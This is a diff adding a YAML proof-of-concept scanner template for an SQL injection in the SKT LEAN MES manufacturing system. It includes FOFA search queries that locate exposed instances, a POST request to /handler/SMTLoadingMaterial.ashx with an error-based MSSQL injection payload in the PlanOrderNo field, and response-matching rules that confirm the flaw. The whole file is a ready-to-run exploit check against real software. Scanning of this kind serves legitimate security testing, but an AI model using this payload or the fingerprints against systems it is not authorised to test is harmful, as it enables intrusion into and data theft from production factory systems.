@@ -1,0 +1,19 @@
+id: poc-yaml-skt-lean-mes-smtloadingmaterial-sqli
+info:
+  name: 深科特 LEAN MES系统 SMTLoadingMaterial SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: lean-mes
+  fofa_1: title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js"
+  fofa_2: body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+requests:
+- method: POST
+  path: /handler/SMTLoadingMaterial.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: type=GetOrderList&PlanOrderNo=1%27+AND+9304+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289304%3D9304%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--+keHv
+  expression: status_code == 500 && contains(body,"在将 varchar 值") && contains(body,"qbqbq1qvkxq")
+    && contains(body,"转换成数据类型 int 时失败")
+variables: {}
+transport: http
